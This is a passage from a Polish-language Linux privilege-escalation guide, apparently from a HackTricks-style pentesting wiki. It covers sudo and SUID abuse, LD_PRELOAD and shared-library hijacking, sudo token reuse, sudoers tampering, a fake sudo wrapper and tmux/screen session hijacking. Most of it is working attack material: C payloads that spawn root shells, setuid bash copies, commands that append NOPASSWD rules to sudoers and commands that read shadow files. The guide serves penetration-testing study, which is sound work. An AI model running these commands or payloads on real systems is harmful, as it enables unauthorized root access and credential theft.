{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system **inter-Process Communication (IPC)**, który umożliwia aplikacjom efektywną wzajemną komunikację i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny — obsługuje podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto ułatwia broadcast zdarzeń lub sygnałów, wspierając płynną integrację między komponentami systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować przyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, porządkując procesy, które wcześniej były skomplikowane.

D-Bus działa w modelu **allow/deny model**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) w oparciu o skumulowany efekt dopasowujących się reguł polityki. Polityki te określają interakcje z busem, co potencjalnie może pozwolić na privilege escalation przez wykorzystanie tych uprawnień.

Przykład takiej polityki znajduje się w `/etc/dbus-1/system.d/wpa_supplicant.conf`, i określa uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalne, podczas gdy polityki kontekstu "default" dotyczą wszystkich nieobjętych innymi, bardziej specyficznymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się tutaj, jak enumerate i exploit komunikację D-Bus:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieć i określić pozycję maszyny.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdź usługi sieciowe uruchomione na maszynie, z którymi nie mogłeś się komunikować przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz pozyskać credentials.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Sprawdź, kim jesteś, jakie masz **privileges**, jacy **users** są w systemie, którzy z nich mogą wykonać **login** i którzy mają **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duże UID

Niektóre wersje Linuxa były dotknięte błędem, który pozwala użytkownikom z **UID > INT_MAX** podnieść uprawnienia. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Wykorzystaj to za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem którejś grupy**, która mogłaby przyznać Ci uprawnienia roota:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** do środowiska **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego hałasu i binarki `su` oraz `timeout` są obecne na komputerze, możesz spróbować brute-force'ować użytkownika używając [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje brute-force'ować użytkowników.

## Nadużycia zapisu w $PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać w jakimś folderze należącym do $PATH**, możesz podwyższyć uprawnienia przez **utworzenie backdoora w zapisywalnym folderze** o nazwie jakiegoś polecenia, które zostanie uruchomione przez innego użytkownika (najlepiej root) i które **nie jest ładowane z katalogu znajdującego się wcześniej** niż Twój zapisywalny katalog w $PATH.

### SUDO i SUID

Możesz mieć możliwość uruchomienia pewnych poleceń przy użyciu sudo lub pliki mogą mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików, a nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration może pozwolić użytkownikowi uruchomić pewne polecenie z uprawnieniami innego użytkownika bez podania hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`; łatwo uzyskać powłokę, dodając klucz ssh do katalogu root lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa umożliwia użytkownikowi **set an environment variable** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **based on HTB machine Admirer**, był **vulnerable** na **PYTHONPATH hijacking**, pozwalający załadować dowolną bibliotekę Pythona podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywne zachowanie startowe Basha, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Dlaczego to działa: Dla nieinteraktywnych powłok, Bash ocenia `$BASH_ENV` i sourcesuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowany przez sudo, twój plik zostanie załadowany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny cel, który wywołuje `/bin/bash` w trybie nieinteraktywnym, lub dowolny bash script).
- `BASH_ENV` obecny w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Udoskonalenia zabezpieczeń:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, preferuj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych binariów.
- Rozważ logowanie I/O sudo i alertowanie, gdy używane są zachowane zmienne środowiskowe.

### Sudo execution bypassing paths

**Skocz** aby przeczytać inne pliki lub użyj **dowiązań symbolicznych**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez ścieżki do polecenia

Jeśli **uprawnienie sudo** zostało przyznane do pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli binarka **suid** **uruchamia inną komendę nie podając do niej ścieżki (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnej binarki SUID)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binarka SUID z podaną ścieżką komendy

Jeśli binarka **suid** **uruchamia inną komendę, podając ścieżkę**, możesz spróbować **export a function** o nazwie odpowiadającej komendzie wywoływanej przez plik suid.

Na przykład, jeśli binarka suid wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować utworzyć funkcję i exportować ją:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz suid binary, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub więcej bibliotek współdzielonych (pliki .so), które mają zostać załadowane przez loader przed wszystkimi innymi, włącznie ze standardową biblioteką C (`libc.so`). Ten proces nazywa się wstępnym ładowaniem biblioteki.

Aby jednak zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych plików **suid/sgid**, system narzuca pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla wykonywalnych plików, w których realny identyfikator użytkownika (_ruid_) nie zgadza się z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z **suid/sgid**, wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają ustawione **suid/sgid**.

Escalacja przywilejów może mieć miejsce, jeśli możesz wykonywać polecenia za pomocą `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala, by zmienna środowiskowa **LD_PRELOAD** była zachowana i rozpoznawana nawet podczas uruchamiania poleceń z `sudo`, co potencjalnie może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skomiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy napotkasz plik wykonywalny (binary) z uprawnieniami **SUID**, który wydaje się nietypowy, warto sprawdzić, czy poprawnie ładuje pliki **.so**. Można to zweryfikować, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość wykorzystania.

Aby to wykorzystać, należy utworzyć plik C, np. _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulację uprawnieniami plików i uruchomienie shella z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku obiektu współdzielonego (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
W końcu uruchomienie dotkniętego pliku binarnego SUID powinno wywołać exploit, umożliwiając potencjalną kompromitację systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje bibliotekę z folderu, do którego możemy zapisywać, stwórzmy bibliotekę w tym folderze o wymaganej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi zawierać funkcję nazwaną `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to skatalogowana lista binarek Uniksa, które atakujący może wykorzystać do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) jest takie samo, ale dla przypadków, gdy możesz **tylko wstrzykiwać argumenty** do polecenia.

Projekt zbiera legalne funkcje binarek Uniksa, które można nadużyć, aby wydostać się z ograniczonych shelli, eskalować lub zachować podwyższone uprawnienia, transferować pliki, uruchamiać bind i reverse shells oraz ułatwiać inne zadania post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajduje sposób na wykorzystanie którejkolwiek reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **sudo access**, ale nie znasz hasła, możesz eskalować uprawnienia, **oczekując na wykonanie polecenia sudo, a następnie przechwytując token sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" **użył `sudo`** do wykonania czegoś w **ciągu ostatnich 15 minut** (domyślnie to czas trwania tokenu sudo, który pozwala używać `sudo` bez ponownego podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` ma wartość 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale, modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. Możesz jej użyć, aby **aktywować token sudo w swojej sesji** (nie otrzymasz automatycznie shella root — wykonaj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- The **second exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia zapisu** w tym folderze lub do któregokolwiek z plików utworzonych w tym folderze, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **utworzyć sudo token dla usera i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten user z PID 1234, możesz **obtain sudo privileges** bez konieczności znajomości hasła, wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeżeli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli masz uprawnienia do zapisu, możesz je nadużyć.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD — pamiętaj, aby sprawdzić jej konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego użytkownika, możesz **utworzyć nowy wykonywalny plik sudo**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak by gdy użytkownik uruchomi sudo, twój program sudo został uruchomiony.

Zwróć uwagę, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Albo uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą ładowane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

To oznacza, że czytane będą pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie wyszukiwał biblioteki wewnątrz `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma prawa zapisu** do którejkolwiek z wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnego pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnego folderu wskazanego w pliku konfiguracyjnym w `/etc/ld.so.conf.d/*.conf` może być w stanie eskalować uprawnienia.\
Sprawdź, **jak wykorzystać tę niewłaściwą konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując lib do `/var/tmp/flag15/`, zostanie ono użyte przez program w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` poleceniem `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uprawnienia (Capabilities)

Linux capabilities zapewniają **podzbiór dostępnych uprawnień roota dla procesu**. To efektywnie dzieli uprawnienia roota na **mniejsze i odrębne jednostki**. Każdą z tych jednostek można następnie niezależnie przyznać procesom. W ten sposób pełny zestaw uprawnień jest zmniejszony, co obniża ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Uprawnienia katalogu

W katalogu, **bit for "execute"** oznacza, że dany użytkownik może "**cd**" do folderu.\
**"read"** bit oznacza, że użytkownik może **wyświetlić** **pliki**, a **"write"** bit oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) reprezentują drugą warstwę uprawnień dowolnych (discretionary), zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do pliku lub katalogu, pozwalając na przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia precyzyjniejsze zarządzanie dostępem**. Dalsze szczegóły można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" read i write uprawnienia do pliku:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACLs z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte sesje shell

W **starych wersjach** możesz **hijack** jakąś sesję **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** tylko z sesjami **screen** swojego użytkownika. Jednak możesz znaleźć **interesujące informacje wewnątrz sesji**.

### screen sessions hijacking

**Wyświetl listę sesji screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Przejęcie sesji tmux

To był problem w przypadku **starych wersji tmux**. Nie byłem w stanie przejąć sesji tmux (v2.1) utworzonej przez root jako użytkownik nieuprzywilejowany.

**Lista sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Ten błąd występuje przy tworzeniu nowego klucza ssh w tych systemach, ponieważ **istniało tylko 32,768 wariacji**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh można wyszukać odpowiadający mu klucz prywatny**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy uwierzytelnianie za pomocą hasła jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą klucza publicznego jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie się na konta z pustymi hasłami. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może się logować za pomocą ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się zalogować używając hasła i klucza prywatnego
- `without-password` or `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: Root może logować się tylko używając klucza prywatnego i jeśli są określone opcje commands
- `no`: brak logowania

### AuthorizedKeysFile

Określa pliki, które zawierają klucze publiczne używane do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki absolutne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się za pomocą **private** key użytkownika "**testusername**" ssh porówna public key twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala Ci **use your local SSH keys instead of leaving keys** (without passphrases!) na Twoim serwerze. Dzięki temu będziesz mógł **jump** via ssh **to a host** i stamtąd **jump to another** host **using** the **key** located in your **initial host**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` jest `*` za każdym razem gdy użytkownik przejdzie na inną maszynę, ten host będzie miał dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwalać** lub **blokować** ssh-agent forwarding przy użyciu słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

Jeśli znajdziesz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie to wykorzystać do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki znajdujące się w `/etc/profile.d/` to **skrypty, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. W związku z tym, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakiś podejrzany skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub istnieć ich kopia zapasowa. Dlatego zaleca się **odnaleźć wszystkie** i **sprawdzić, czy można je odczytać**, żeby zobaczyć, **czy wewnątrz plików znajdują się hashe**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub jego odpowiedniku).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisalny /etc/passwd

